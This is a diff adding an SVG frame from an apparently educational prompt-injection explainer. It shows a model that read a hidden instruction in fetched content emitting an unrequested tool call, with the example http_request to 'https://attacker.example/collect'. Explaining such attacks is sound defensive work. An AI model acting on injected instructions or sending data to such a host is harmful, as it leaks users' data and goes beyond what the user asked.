@@ -1,0 +1,55 @@
+<svg viewBox="0 0 900 400" xmlns="http://www.w3.org/2000/svg" role="img"
+     aria-label="Frame 3 of 4 in the prompt injection sequence. The model, having read the hidden instruction as part of the transcript, emits a tool_use block the user never asked for, such as a call to send an HTTP request to an attacker-controlled address. The model cannot distinguish the injected instruction from a legitimate request, so it treats the hidden text as something to act on.">
+  <style>
+    .lbl   { font-family: -apple-system, "Segoe UI", Helvetica, Arial, sans-serif; fill: #1f2937; }
+    .h1    { font-size: 15px; font-weight: 700; letter-spacing: .5px; }
+    .node  { font-size: 13px; font-weight: 600; }
+    .body  { font-size: 12.5px; }
+    .sub   { font-size: 10.5px; fill: #4b5563; }
+    .tiny  { font-size: 11px; }
+
+    .boxP  { fill: #dbeafe; stroke: #2563eb; stroke-width: 1.6; }
+    .boxD  { fill: #fee2e2; stroke: #b91c1c; stroke-width: 1.6; }
+    .boxA  { fill: #eff6ff; stroke: #2563eb; stroke-width: 1.6; }
+
+    .flow  { fill: none; stroke: #475569; stroke-width: 2; stroke-linejoin: round; marker-end: url(#tri); }
+  </style>
+  <defs>
+    <marker id="tri" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="6" markerHeight="6" orient="auto">
+      <path d="M 0 0 L 10 5 L 0 10 z" fill="#475569"/>
+    </marker>
+  </defs>
+
+  <rect x="0" y="0" width="900" height="400" fill="#ffffff"/>
+
+  <text x="20" y="32" class="lbl h1">PROMPT INJECTION &#8212; FRAME 3 OF 4</text>
+  <line x1="20" y1="42" x2="880" y2="42" stroke="#d1d5db" stroke-width="1.5"/>
+  <text x="20" y="64" class="lbl node">the model emits a tool_use block the user never asked for</text>
+
+  <rect x="60" y="90" width="280" height="70" rx="6" class="boxP"/>
+  <text x="200" y="114" text-anchor="middle" class="lbl node">model reasoning</text>
+  <text x="200" y="134" text-anchor="middle" class="lbl sub">hidden instruction present</text>
+  <text x="200" y="150" text-anchor="middle" class="lbl sub">in the transcript, unflagged</text>
+
+  <path class="flow" d="M 340 125 H 400"/>
+
+  <rect x="400" y="90" width="360" height="90" rx="6" class="boxD"/>
+  <text x="580" y="114" text-anchor="middle" class="lbl node">tool_use block emitted</text>
+  <text x="580" y="134" text-anchor="middle" class="lbl sub">e.g. http_request(url:</text>
+  <text x="580" y="150" text-anchor="middle" class="lbl sub">"https://attacker.example/collect")</text>
+  <text x="580" y="166" text-anchor="middle" class="lbl sub">never requested by the user</text>
+
+  <rect x="60" y="220" width="700" height="90" rx="6" class="boxA"/>
+  <text x="76" y="242" class="lbl tiny" font-weight="700">Why this happens</text>
+  <text x="76" y="262" class="lbl tiny">The model treats the hidden instruction the same as any other instruction in context &#8212; it does not carry a</text>
+  <text x="76" y="278" class="lbl tiny">provenance tag saying "this came from fetched data, not the user." Producing the tool_use block is the model</text>
+  <text x="76" y="294" class="lbl tiny">acting on what looks, in the transcript, like a normal request. See Frame 4 for what stands between this and execution.</text>
+
+  <line x1="20" y1="340" x2="880" y2="340" stroke="#d1d5db" stroke-width="1.5"/>
+  <rect x="20" y="346" width="22" height="16" rx="3" class="boxP"/>
+  <text x="50" y="359" class="lbl tiny">model's internal state</text>
+  <rect x="260" y="346" width="22" height="16" rx="3" class="boxD"/>
+  <text x="290" y="359" class="lbl tiny">unrequested tool_use block</text>
+  <rect x="520" y="346" width="22" height="16" rx="3" class="boxA"/>
+  <text x="550" y="359" class="lbl tiny">annotation panel</text>
+</svg>
